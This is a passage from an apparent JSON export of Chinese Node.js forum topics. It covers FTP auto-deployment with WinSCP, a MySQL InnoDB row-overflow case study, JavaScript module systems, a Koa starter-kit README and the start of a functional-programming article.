(error) {\n    console.error(&#x27;error: &#x27; + error)\n    return\n  }\n  console.log(&#x27;FTP发布完成！详情请看日志：&#x27; + &#x27;D:\\\\我的项目.log&#x27;)\n})\n</code></pre><p>然后就可以愉快的自动发布了</p>\n<pre class=\"prettyprint language-bash\"><code># Windows PowerShell\nPS D:\\我的项目&gt;npm run build:ftp\n</code></pre><blockquote>\n<p>Tips: 由于每个人的软件安装和系统环境不同， 所以这个ftp.js的文件最好是加入.gitignore里面，也避免代码开源上传到GitHub导致的服务器账号泄露</p>\n</blockquote>\n</div>","title":"用Nodejs+WinSCP自动build完发布到服务器上","last_reply_at":"2018-12-28T01:39:10.755Z","good":false,"top":false,"reply_count":8,"visit_count":1113,"create_at":"2018-12-20T06:24:48.283Z","author":{"loginname":"Cheesenx","avatar_url":"https://avatars2.githubusercontent.com/u/25993112?v=4&s=120"}},{"id":"5c201dca3898674067a7768b","author_id":"57de06085710e2ed658d6bd4","tab":"ask","content":"<div class=\"markdown-text\"><p>最近听说各个大厂都在裁员，是真的吗？</p>\n</div>","title":"大厂裁员潮，是真的吗？","last_reply_at":"2018-12-27T07:26:31.602Z","good":false,"top":false,"reply_count":16,"visit_count":2534,"create_at":"2018-12-23T23:44:10.734Z","author":{"loginname":"duzitengg","avatar_url":"https://avatars2.githubusercontent.com/u/21256522?v=4&s=120"}},{"id":"5c2476b176c4964062a1e622","author_id":"57c8dfcf2adfc63a267843fd","tab":"ask","content":"<div class=\"markdown-text\"><p>像mysql、mongo、redis，还有消息中间件，像rabbitmq、kafka，是不是都是基于tcp协议，都是长连接。</p>\n</div>","title":"数据库连接协议是不是都是基于tcp协议的应用层协议？","last_reply_at":"2018-12-27T06:52:33.866Z","good":false,"top":false,"reply_count":0,"visit_count":624,"create_at":"2018-12-27T06:52:33.866Z","author":{"loginname":"xwlyy","avatar_url":"https://avatars1.githubusercontent.com/u/18543527?v=4&s=120"}},{"id":"5c244b3f3898674067a78de2","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<h2><strong>一、从常见的报错说起</strong></h2>\n<p>​        故事的开头我们先来看一个常见的sql报错信息：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1010221/gd47sr81y4.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>​        相信对于这类报错大家一定遇到过很多次了，特别对于OMG这种已内容生产为主要工作核心的BG，在内容线的存储中，数据大一定是个绕不开的话题。这里的数据“大”，远不止存储空间占用多，其中也包括了单个（表）字段存储多、大，数据留存时间长，数据冗余多，冷热数据不明显导致的体量大，访问峰值随着热点变化明显，逻辑处理复杂导致数据存储压力放大等等。回到这个报错的问题上来，我们先来看一下这个表的结构：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1010221/5s779kpj24.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>看到这里，我相信大家会有不同的处理方式了，这里就不对各种处理方式的优劣做比较了，仅仅叙述使用频率较高的两种处理方式。</p>\n<ul>\n<li>根据报错的指引，把两个大的varchar（22288）改成text、blob</li>\n<li>根据业务特点，缩小varchar的存储长度,或者按照规则拆分成多个小的vachar和char</li>\n</ul>\n<p>​       这两种的处理方式也各有优缺点，把字段改成text或者blob，不仅增大了数据存储的容量，对这个字段的索引页只能采用前缀或者全文索引了，如果业务侧存储的是json格式的数据，5.7支持json数据类型是个不错的选择，可以针对单个子类进行查询和输出。同样如果缩小和拆分的话就比较依赖业务的场景和逻辑需求了，业务使用的逻辑上需要修改，工程量也需要评估。</p>\n<h2><strong>二、深入探索</strong></h2>\n<p>​       接着我们再来深入分析下关于限制大小“65535”的一些容易混淆的概念。</p>\n<p><strong>1、“65535”不是单个varchar(N)中N的最大限制，而是整个表非大字段类型的字段的bytes总合。</strong></p>\n<p>---------------------------------------------------------------------------------------------</p>\n<p>Every table (regardless of storage engine) has a maximum row size of 65,535 bytes. Storage engines may place additional constraints on this limit, reducing the effective maximum row size.</p>\n<p>---------------------------------------------------------------------------------------------</p>\n<p>2、不同的字符集对字段可存储的max会有影响，例如，UTF8字符需要3个字节存储，对于VARCHAR（255）CHARACTER SET UTF8列，会占用255×3 =765的字节。故该表不能包含超过65,535/765=85这样的列。GBK是双字节的以此类推。</p>\n<p>3、可变长度列在评估字段大小时还要考虑存储列实际长度的字节数。例如，VARCHAR（255）CHARACTER SET UTF8列需要额外的两个字节来存储值长度信息，所以该列需要多达767个字节存储，其实最大可以存储65533字节，剩余两个字节存储长度信息。</p>\n<p>4、BLOB、TEXT、JSON列不同于varchar、char等字段，列长度信息独立于行长存储，可以达到65535字节真实存储</p>\n<p>5、定义NULL列会降低允许的最大列数。</p>\n<ul>\n<li>InnoDB表，NULL和NOT NULL列存储大小是一样</li>\n<li>MyISAM表，NULL列需要额外的空间记录其值是否为NULL。每个NULL需要一个额外的位（四舍五入到最接近的字节）。最大行长度计算如下：</li>\n</ul>\n<p>​         row length = 1  + (sum of column lengths)   + (number of NULL columns + delete_flag + 7)/8 + (number of variable-length columns)</p>\n<ul>\n<li>​        静态表，delete_flag = 1，静态表通过在该行记录一个位来标识该行是否已被删除。</li>\n<li>​        动态表，delete_flag = 0，该标记存储在动态行首，动态表具体可以根据</li>\n</ul>\n<p>6、对于InnoDB表，NULL和NOT NULL列存储大小是一样</p>\n<p>7、InnoDB允许单表最多1000个列</p>\n<p>8、varchar主键只支持不超过767个字节或者768/2=384个双字节 或者767/3=255个三字节的字段 而GBK是双字节的，UTF8是三字节的</p>\n<p>9、不用的引擎对索引的限制有区别</p>\n<ul>\n<li>innodb每个列的长度不能大于767 bytes；所有组成索引列的长度和不能大于3072 bytes</li>\n<li>myisam 每个列的长度不能大于1000 bytes，所有组成索引列的长度和不能大于1000 bytes</li>\n</ul>\n<h2>三、真正的故障</h2>\n<p>​      下面来说下今天遇到的业务故障，线上业出现了大量的如下报错，导致程序无法写入数据：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1010221/05xhqb9ob9.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>按照提示和正常的思路，我们先第一反应认为业务存在如下的问题：</p>\n<ul>\n<li>设置的表结构中字段超过了限制</li>\n<li>某个字段插入的数据长度超过了改字段设置的max值</li>\n</ul>\n<p>​        接着查看了业务的库表结构，如下：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1010221/b63rdnfv49.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>​       很快排除了第一个原因，因为首先业务的报错不是在建立表的时候出现的，如果是表中非大字段之和65535，在建表的时候就会出错，而业务是在写入的时候才报错的，而且通过库表结构也能发现大量的都是mediumblob类型字段，非大字段加起来远小于65535。</p>\n<p>​       接着根据业务提供的具体SQL，appversion、datadata、elt_stamp、id这几个非大字段，也并没有超过限制，mediumblob类型字段最大可存储16M，业务的数据远远没有达到这个量级。按照报错的提示把 appversion、datadata、elt_stamp、id这几个非大字段均改成blob类型，还是无法解决。（根据之前的分析，必然不是问题的根源）。</p>\n<p>​       冷静下来后，发现其实还有个细节被忽略掉了，业务的失败率不是100%，说明还是有成功的请求，通过对比成功和失败的sql，发现果然数据量差异的还是mediumblob类型字段。那么现在第一个想到的就是，max_allowed_packet这个参数，是不是调小了，是的单个请求超过大小被拒绝了，查了下配置的值（如下图），配置的大小1G，sql的数据长度远没有这么大，这个原因也排除了。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1010221/dlal18263o.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>​         查到这里基本上排除了常见几个问题，接着再看一下另一个参数的限制：<strong>innodb_page_size，这个的默认值是16K，每个page两行数据，所以每行最大8k数据。</strong></p>\n<p>查看了下数据表Row_format是Compact，那么我们可以推断问题的原因应该就是<strong>innodb默认的approach存储格式会把每个blob字段的前864个字节存储在page里，所以blob超过一定数量的话，单行大小就会超过8k</strong>，所以就报错了。通过对比业务写成功和失败的SQL也应征了这个推论，那么现在要怎么解决这个问题？</p>\n<ul>\n<li>业务拆分表，大字段进行分表存储</li>\n<li>通过解决Row_format的存储方式解决问题</li>\n</ul>\n<p>由于业务单表的存储条数并不大，而且业务逻辑不适合拆分，所以我们要在Row_format上来解决这个问题。</p>\n<p>​       Barracuda文件格式下拥有两种新的行记录格式Compressed和Dynamic两种，新的两种格式对于存放BLOB的数据采用了完全的行溢出的方式，在数据页中只存放20个字节的指针，实际的数据都存放在BLOB Page中。Compressed行记录格式的另一个功能就是存储在其中的数据会以zlib的算法进行压缩。</p>\n<p>相关的变更操作就相对简单了：</p>\n<p>​     <strong>1、</strong> <strong>修改MySQL全局变量：</strong></p>\n<p>​           <strong>SET GLOBAL innodb_file_format=‘Barracuda’;</strong></p>\n<p>​    <strong>2、平滑变更原表的属性：</strong></p>\n<p>​           <strong>ROW_FORMAT=COMPRESSED</strong></p>\n<h2>四、继续学习</h2>\n<p>​       通过这个案例我们可以从中提炼出两个值得深入研究一下的点：</p>\n<p><strong>1、关于innodb_page_size</strong></p>\n<p>​      从MySQL5.6开始，innodb_page_size可以设置Innodb数据页为8K,4K，默认为16K。这个参数在一开始初始化时就要加入my.cnf里，如果已经创建了表，再修改，启动MySQL会报错。</p>\n<p>那么在5.6的版本之前要修改这个值，怎么办？那只能是在源码上做点文章了，然后重新rebuild一下MySQL。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1010221/bygm4q2137.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>​         UNIV_PAGE_SIZE是数据页大小，默认的是16K，该值是可以设置必须为2的次方。对于该值可以设置成4k、8k、16k、32K、64K。同时更改了UNIV_PAGE_SIZE后需要更改UNIV_PAGE_SIZE_SHIFT 该值是2的多少次方为UNIV_PAGE_SIZE，所以设置数据页分别情况如下：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1010221/kq8ao4ua0t.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>​          接着再来说一下innodb_page_size设置成不同值的对于mysql性能上的影响，测试的表含有1亿条记录，文件大小30G。</p>\n<p>​            ①读写场景（50%读50%写）</p>\n<p>​                16K，对CPU压力较小，平均在20%</p>\n<p>​                8K，CPU压力为30%~40%，但select吞吐量要高于16K</p>\n<p>​            ②读场景（100%读）</p>\n<p>​               16K和8K差别不明显</p>\n<p>​      <strong>InnoDB Buffer Pool管理页面本身也有代价，Page数越多，那么相同大小下，管理链表就越长。因此当我们的数据行本身就比较长（大块插入），更大的页面更有利于提升速度，因为一个页面可以放入更多的行，每个IO写的大小更大，可以更少的IOPS写更多的数据。 当行长超过8K的时候，如果是16K的页面，就会强制转换一些字符串类型为TEXT，把字符串主体转移到扩展页中，会导致读取列需要多一个IO，更大的页面也就支持了更大的行长，64K页面可以支持近似32K的行长而不用使用扩展页。 但是如果是短小行长的随机读取和写入，则不适合使用这么大的页面，这会导致IO效率下降，大IO只能读取到小部分。</strong></p>\n<p><strong>2、关于Row_format</strong></p>\n<p>​        Innodb存储引擎保存记录，是以行的形式存放的。在InnoDB 1.0.x版本之前，InnoDB 存储引擎提供了 Compact 和 Redundant 两种格式来存放行记录数据。MySQL 5.1 中的innodb_plugin 引入了新的文件格式：Barracuda，该文件格式拥有新的两种行格式：compressed和dynamic。并且把 compact 和 redundant 合称为Antelope。可以通过命令SHOW TABLE STATUS LIKE ‘table_name’；来查看当前表使用的行格式，其中 row_format 列表示当前所使用的行记录结构类型。</p>\n<p>​       MySQL 5.6 版本中，默认 Compact ，msyql 5.7.9 及以后版本，默认行格式由innodb_default_row_format变量决定，默认值是DYNAMIC，也可以在 create table 的时候指定ROW_FORMAT=DYNAMIC（通过这个可动态调整表的存储格式）。如果要修改现有表的行模式为compressed或dynamic，必须先将文件格式设置成Barracuda（set global innodb_file_format=Barracuda;）。再用ALTER TABLE tablename ROW_FORMAT=COMPRESSED;去修改才能生效，否则修改无效却无提示。</p>\n<h3>①compact</h3>\n<p>​     <strong>如果blob列值长度</strong> <strong>&lt;= 768 bytes，不会发生行溢出(page overflow)，内容都在数据页(B-tree Node)；如果列值长度</strong> <strong>&gt; 768字节，那么前768字节依然在数据页，而剩余的则放在溢出页(off-page)，如下图：</strong></p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1010221/ypqmo4lnl1.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>​        上面讲的blob或变长大字段类型包括blob、text、varchar，其中varchar列值长度大于某数N时也会存溢出页，在latin1字符集下N值可以这样计算：innodb的块大小默认为16kb，由于innodb存储引擎表为索引组织表，树底层的叶子节点为一双向链表，因此每个页中至少应该有两行记录，这就决定了innodb在存储一行数据的时候不能够超过8k，减去其它列值所占字节数，约等于N。</p>\n<h3>②compressed或dynamic</h3>\n<p><strong>对blob采用完全行溢出，即聚集索引记录（数据页）只保留20字节的指针，指向真实存放它的溢出段地址：</strong></p>\n<p><img src=\"https://ask.qcloudimg.com/draft/1010221/xwl8hwpcld.jpg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>​         dynamic行格式，列存储是否放到off-page页，主要取决于行大小，它会把行中最长的那一列放到off-page，直到数据页能存放下两行。TEXT/BLOB列 &lt;=40 bytes 时总是存放于数据页。可以避免compact那样把太多的大列值放到 B-tree Node，因为dynamic格式认为，只要大列值有部分数据放在off-page，那把整个值放入都放入off-page更有效。</p>\n<p>​         compressed 物理结构上与dynamic类似，但是对表的数据行使用zlib算法进行了压缩存储。在long blob列类型比较多的情况下用，可以降低off-page的使用，减少存储空间（50%左右，可参见之前“【数据库评测报告】第三期：innodb、tokudb压缩性能”报告中的测试结果），但要求更高的CPU，buffer pool里面可能会同时存储数据的压缩版和非压缩版，所以也多占用部分内存。</p>\n<p>​         最后参考了《高性能MySQL》，给出一些使用BLOB这类变长大字段类型的建议：</p>\n<p>​          ①大字段在InnoDB里可能浪费大量空间。例如，若存储字段值只是比行的要求多了一个字节，也会使用整个页面来存储剩下的字节，浪费了页面的大部分空间。同样的，如果有一个值只是稍微超过了32个页的大小，实际上就需要使用96个页面。</p>\n<p>​          ②太长的值可能使得在查询中作为WHERE条件不能使用索引，因而执行很慢。在应用WHERE条件之前，MySQL需要把所有的列读出来，所以可能导致MySQL要求InnoDB读取很多扩展存储，然后检查WHERE条件，丢弃所有不需要的数据。</p>\n<p>​          ③一张表里有很多大字段，最好组合起来单独存到一个列里面。让所有的大字段共享一个扩展存储空间，比每个字段用自己的页要好。</p>\n<p>​          ④把大字段用COMPRESS()压缩后再存为BLOB，或者在发送到MySQL前在应用程序中进行压缩，可以获得显著的空间优势和性能收益。</p>\n<p>​         ⑤扩展存储禁用了自适应哈希，因为需要完整的比较列的整个长度，才能发现是不是正确的数据。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"【MySQL经典案例分析】关于数据行溢出由浅至深的探讨","last_reply_at":"2018-12-27T03:58:04.946Z","good":false,"top":false,"reply_count":1,"visit_count":499,"create_at":"2018-12-27T03:47:11.606Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c20554076c4964062a1cf21","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>模块化是指把一个复杂的系统分解到一个一个的模块。</p>\n<p><strong>模块化开发的优点</strong>：</p>\n<p>(1)代码复用，让我们更方便地进行代码管理、同时也便于后面代码的修改和维护。</p>\n<p>(2)一个单独的文件就是一个模块，是一个单独的作用域，只向外暴露特定的变量和函数。这样可以避免污染全局变量，减少变量命名冲突。</p>\n<p>js模块化规范有：CommonJS、AMD、CMD、ES6的模块系统。本文将依次介绍下每个规范。</p>\n<h1>0.早期：用script来引入js模块</h1>\n<pre class=\"prettyprint language-js\"><code>&lt;script type=&quot;text&#x2F;javascript&quot; src=&quot;a.js&quot;&gt;&lt;&#x2F;script&gt;\n&lt;script type=&quot;text&#x2F;javascript&quot; src=&quot;b.js&quot;&gt;&lt;&#x2F;script&gt;\n&lt;script type=&quot;text&#x2F;javascript&quot; src=&quot;c.js&quot;&gt;&lt;&#x2F;script&gt;\n&lt;script type=&quot;text&#x2F;javascript&quot; src=&quot;d.js&quot;&gt;&lt;&#x2F;script&gt;\n</code></pre><p><strong>缺点：</strong></p>\n<p>(1)加载的时候会停止渲染网页，引入的js文件越多，网页失去响应的时间越长；</p>\n<p>(2)会污染全局变量；</p>\n<p>(3)js文件之间存在依赖关系，加载是有顺序的，依赖性最大的要放到最后去加载；当项目规模较大时，依赖关系变得错综复杂。</p>\n<p>(4)要引入的js文件太多，不美观，代码难以管理。</p>\n<h1>1.CommonJS 规范</h1>\n<p>是<strong>服务器端模块的规范</strong>，由nodejs推广使用。该规范的核心思想是：允许模块通过require方法来同步加载所要依赖的其他模块，然后通过 exports 或module.exports 来导出需要暴露的接口。</p>\n<blockquote>\n<p>CommonJS 还可以细分为 CommonJS1 和 CommonJS2，区别在于 CommonJS1 只能通过 exports.xx = xx 的方式导出，CommonJS2 在 CommonJS1 的基础上加入了module.exports = xx 的导出方式。 CommonJS 通常指 CommonJS2。</p>\n</blockquote>\n<p>采用CommonJS 规范导入导出：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 导出\nmodule.exports = moduleA.someFunc;\n&#x2F;&#x2F; 导入\nconst moduleA = require(&#x27;.&#x2F;moduleA&#x27;);\n</code></pre><p>实例：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;math.js\nvar num = 0;\nfunction add(a, b) {\n  return a + b;\n}\nmodule.exports = {\n  &#x2F;&#x2F;需要向外暴露的变量、函数\n  num: num,\n  add: add\n}\n</code></pre><p>可以这样加载：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;引入自定义的模块时，参数包含路径，可省略.js\n&#x2F;&#x2F;引入核心模块时，不需要带路径，如var http = require(&quot;http&quot;);\nvar math = require(&#x27;.&#x2F;math&#x27;);\nmath.add(1, 2)&#x2F;&#x2F;3\n</code></pre><p>实际上，从上面的例子就可以看出，math.add(1,2)必须要等待math.js加载完成，即require是同步的。</p>\n<p>在服务器端，模块文件保存在本地磁盘，等待时间就是磁盘的读取时间。但对于浏览器而言，由于模块都放在服务器端，等待时间取决于网上的快慢。因此更合理的方案是异步加载模块。</p>\n<p><strong>缺点：</strong></p>\n<p>(1)不能并行加载模块，会阻塞浏览器加载；</p>\n<p>(2)代码无法直接运行在浏览器环境下，必须通过工具转换成标准的 ES5；</p>\n<h1>2.AMD和require.js</h1>\n<p>AMD：异步模块定义。上面已经介绍过，CommonJS是服务器端模块的规范，主要是为了JS在后端的表现制定的，不太适合前端。而AMD就是要为前端JS的表现制定规范。由于不是JavaScript原生支持，使用AMD规范进行页面开发需要用到对应的库函数，也就是require.js（还有个js库：curl.js）。实际上AMD 是 require.js在推广过程中对模块定义的规范化的产出。</p>\n<p>AMD采用异步方式加载模块，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行。</p>\n<p>require.js也采用require()语句加载模块，但是不同于CommonJS：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 定义一个模块\ndefine(&#x27;module&#x27;, [&#x27;dep&#x27;], function (dep) {\n  return exports;\n});\n\n&#x2F;&#x2F; 导入和使用\nrequire([&#x27;module&#x27;], function (module) {\n});\n</code></pre><p>上面示例中的代码改写成AMD形式：</p>\n<p>math.js定义一个模块:</p>\n<pre class=\"prettyprint language-js\"><code>define(&#x27;math&#x27;, [&#x27;jquery&#x27;], function (jquery) {&#x2F;&#x2F;引入jQuery模块\n  return {\n    add: function (x, y) {\n      return x + y;\n    }\n  };\n});\n</code></pre><p>导入和使用：</p>\n<pre class=\"prettyprint language-js\"><code>require([&#x27;math&#x27;], function (math) {\n  math.add(1, 2)\n})\n</code></pre><p>math.add()与加载math模块不是同步的，不会阻塞浏览器的加载。</p>\n<h1>3.CMD和sea.js</h1>\n<p>CMD：通用模块定义。</p>\n<p>国内的玉伯大佬写了sea.js，实际上CMD就是 sea.js在推广过程中对模块定义的规范化的产出。</p>\n<pre class=\"prettyprint language-js\"><code>define(function (require, exports, module) {\n  &#x2F;&#x2F; 模块代码\n});\n</code></pre><p>说明：</p>\n<p>require：可以把其他模块导入进来的一个参数；</p>\n<p>exports：可以把模块内的一些属性和方法导出的；</p>\n<p>module： 是一个对象，上面存储了与当前模块相关联的一些属性和方法。</p>\n<p>上面示例中的代码改写成AMD形式：</p>\n<pre class=\"prettyprint language-js\"><code>define(function (require, exports, module) {\n  var add = function (a, b) {\n    return a + b;\n  }\n  exports.add = add;\n})\n\n&#x2F;&#x2F;导入和使用\nseajs.use([&#x27;math.js&#x27;], function (math) {\n  var sum = math.add(1, 2);\n});\n</code></pre><p><strong>CMD与AMD的不同的在于：</strong></p>\n<p>(1)AMD推崇依赖前置；CMD推崇依赖就近，只有在用到某个模块的时候再去require：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;AMD推崇的依赖关系前置：在定义模块时就要声明要依赖的模块\ndefine([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;], function (a, b, c, d) { &#x2F;&#x2F; 依赖必须一开始就写好\n  a.doSomething()\n  &#x2F;&#x2F; 此处省略100行\n  ...\n  b.doSomething()\n  ...\n})\n\n&#x2F;&#x2F;CMD推崇依赖就近，按需加载，只有在用到某个模块时再去require\ndefine(function (require, exports, modules) {\n  var a = require(&#x27;a&#x27;);\n  a.doSomething();\n  &#x2F;&#x2F; 此处省略100行\n  ...\n  var b = require(&quot;b&quot;);&#x2F;&#x2F;按需加载\n  b.doSomething();\n  ...\n})\n</code></pre><p>(2)AMD 的 API 默认是一个当多个用，CMD 的 API 严格区分，推崇职责单一。</p>\n<p>对于依赖的模块，AMD是提前执行，CMD是延迟执行。</p>\n<p>具体细节可点击<a href=\"https://github.com/seajs/seajs/issues/277\">参考</a></p>\n<h1>4.ES6模块化</h1>\n<p>ES6在语言的层面上实现了模块化。浏览器厂商和 Node.js 都宣布要原生支持该规范。它将逐渐取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。</p>\n<p>在 ES6 中，使用export关键字来导出模块，使用import关键字引用模块。但是浏览器还没有完全兼容，需要使用babel转换成ES5。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 导出\nexport function hello() { };\nexport default {\n  &#x2F;&#x2F; ...\n};\n&#x2F;&#x2F; 导入\nimport { readFile } from &#x27;fs&#x27;;\nimport React from &#x27;react&#x27;;\n</code></pre><p>使用import导入模块时，需要知道要加载的变量名或函数名。</p>\n<p>在ES6中还提供了export default，为模块指定默认输出.对应导入模块import时，不需要使用大括号。</p>\n<p>上面示例中的代码改写成ES6形式：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F;math.js\nvar num = 0;\nvar add = function (a, b) {\n  return a + b;\n};\nexport { num, add };\n\n&#x2F;&#x2F;导入\nimport { num, add } from &#x27;.&#x2F;math&#x27;;\nfunction test(ele) {\n  ele.textContent = add(1 + num);\n}\n</code></pre><p><strong>缺点</strong></p>\n<p>浏览器还没有完全兼容，必须通过工具转换成标准的 ES5 后才能正常运行。</p>\n<h1>5.小结</h1>\n<p>本文从script引入js文件讲起，到服务器端模块的规范CommonJs，再到推崇依赖前置的浏览器端模块的规范AMD、推崇依赖就近的浏览器端模块的规范CMD，最后介绍了ES6的模块化。每个介绍中都有各规范基本的用法和一个示例。如有问题，欢迎指正。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"一览js模块化：从CommonJS到ES6","last_reply_at":"2018-12-27T03:54:13.980Z","good":false,"top":false,"reply_count":5,"visit_count":808,"create_at":"2018-12-24T03:40:48.684Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c2438b93898674067a78d2a","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h1>klg-koa-starter-kit</h1>\n<p>考拉后端项目模板</p>\n<h2>前言</h2>\n<p>考拉业务蒸蒸日上，为了开发小伙伴少掉坑少填坑少掉发，技术team做了模块化设计，根据业务类型划分代码模块。<br>\n这部分还在完善中，大家有疑问的，欢迎盖楼提问！说不定dev小哥哥会现身解答！</p>\n<h2>软件版本</h2>\n<ul>\n<li>Node 8+</li>\n<li>npm 5+</li>\n<li>typescript 2.8+</li>\n</ul>\n<h2>QuickStart</h2>\n<h3>clone 本项目</h3>\n<pre class=\"prettyprint language-bash\"><code>git clone https:&#x2F;&#x2F;github.com&#x2F;kaolalicai&#x2F;klg-koa-starter-kit.git\n</code></pre><h3>使用 klg-init</h3>\n<p>先安装 klg-init</p>\n<pre class=\"prettyprint language-bash\"><code>npm i klg-init -g\n</code></pre><p>初始化项目</p>\n<pre class=\"prettyprint language-bash\"><code>klg-init --type project-ts foo\n</code></pre><h2>系统模块</h2>\n<p>要提高代码的可维护性和可拓展性，主要手段就是解耦代码，根据业务划分代码模块是非常有必要的。</p>\n<h3>模块约定</h3>\n<p>为了封装各类业务，规范业务边界，我们做了模块化的设计。src 目录下的每个子目录均代表一个模块，为了控制模块的引用关系，有如下约定：</p>\n<ul>\n<li>模块通过 index.ts 暴露接口和函数；</li>\n<li>模块通过 modules.ts 引入其他模块的接口和函数；</li>\n</ul>\n<h3>模块层级</h3>\n<p>模块之间有严格的上下层关系，上层模块可以引用下层模块。这样设计是为了避免<a href=\"http://www.ruanyifeng.com/blog/2015/11/circular-dependency.html\">循环引用</a>.\n模块间的关系图见 document/系统模块图.puml</p>\n<h3>循环引用</h3>\n<p>出现这个问题，首先考虑你的设计是否正确，大部分原因是你没有把代码放在合适的模块中，例如在底层模块 Lib 里调用上层模块 Order。</p>\n<p>如果的确需要循环依赖的话，可以使用事件来解开这个环，底层模块 Lib 抛出事件，再由事件模块调用上层模块 Order 执行。</p>\n<h2>API 接口文档</h2>\n<h3>生成文档</h3>\n<pre class=\"prettyprint language-bash\"><code>$ npm run doc\n</code></pre><h3>查看文档</h3>\n<p>启动服务：</p>\n<pre class=\"prettyprint language-bash\"><code>$ npm run dev\n</code></pre><p>访问 <a href=\"http://localhost:3008/docs/index.html\">http://localhost:3008/docs/index.html</a></p>\n<h2>UML 图</h2>\n<p>请安装 <a href=\"http://plantuml.com/\">plantuml</a> 插件</p>\n<h2>Test</h2>\n<p>我们根据业务情况设置了两种测试类型，运行所有测试：</p>\n<pre class=\"prettyprint language-bash\"><code>$ npm run test\n</code></pre><h3>单元测试</h3>\n<p>优势是可以测试丰富的case，覆盖率高，但是编写成本高，可以只针对核心接口做多 case 的单元测试</p>\n<pre class=\"prettyprint language-bash\"><code>$ npm run test-unit\n</code></pre><h3>流程测试</h3>\n<p>又称端到端（e2e）测试，模拟用户操作进行的测试，优势成本低，一个测试可以覆盖到大部分分支，缺点是比较重，要覆盖所有分支成本高。</p>\n<pre class=\"prettyprint language-bash\"><code>$ npm run test-e2e\n</code></pre><h3>测试覆盖率</h3>\n<pre class=\"prettyprint language-bash\"><code>$ npm run cov\n</code></pre><h2>Docker 镜像打包</h2>\n<pre class=\"prettyprint language-bash\"><code>$ make build\n</code></pre><p>默认推送到公司仓库，可以在 Makefile 中修改仓库地址和镜像信息</p>\n<h2>本项目使用的外部开源库</h2>\n<ul>\n<li>config 配置，根据不同的环境切换配置</li>\n<li>ioredis redis 连接</li>\n<li>joi 参数校验</li>\n<li>klg-logger 日志</li>\n<li>klg-number 数字处理</li>\n<li>klg-redlock 分布式锁</li>\n<li>klg-request http请求</li>\n<li>klg-tracer http请求log</li>\n<li>koa + 中间件 mvc框架</li>\n<li>mongoose mongodb orm</li>\n<li>apidoc api 从注释生成接口文档</li>\n<li>jest 测试框架</li>\n<li>nock http mock</li>\n<li>supertest koa test 工具</li>\n<li>tslint typescript lint</li>\n<li>tslint-config-klg typescript code style</li>\n</ul>\n<hr>\n<p>著作权归本文作者所有，未经授权，请勿转载，谢谢。</p>\n</div>","title":"AI考拉技术分享-Node基础架构专题（一）","last_reply_at":"2018-12-27T02:28:09.328Z","good":false,"top":false,"reply_count":0,"visit_count":646,"create_at":"2018-12-27T02:28:09.328Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5c2432273898674067a78cc8","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> JS函数式编程入门。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017511211\">学会使用函数式编程的程序员(第1部分)</a></li>\n<li>作者：<a href=\"https://segmentfault.com/u/minnanitkong\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p><img src=\"https://image.fundebug.com/2018-12-27-01.png\" alt></p>\n<p>在这篇由多部分组成的文章中，接下来将介绍函数式编程的一些概念，这些概念对你学习函数式编程有所帮助。如果你已经懂了什么是函数式编程，这可以加深你的理解。</p>\n<p>请不要着急。从这一点开始，花点时间阅读并理解代码示例。你甚至可能想在每节课结束后停止阅读，以便让你的观点深入理解，然后再回来完成。</p>\n<p><strong>最重要的是你要理解。</strong></p>\n<h3>纯函数(Purity)</h3>\n<p>所谓纯函数，就是指这样一个函数，对于相同的输入，永远得到相同的输出，它不依赖外部环境，也不会改变外部环境。如果不满足以上几个条件那就是非纯函数。</p>\n<p>下面是Javascript中的一个纯函数示例:</p>\n<pre class=\"prettyprint language-javascript\"><code>var z = 10;\nfunction add(x, y) {\n    return x + 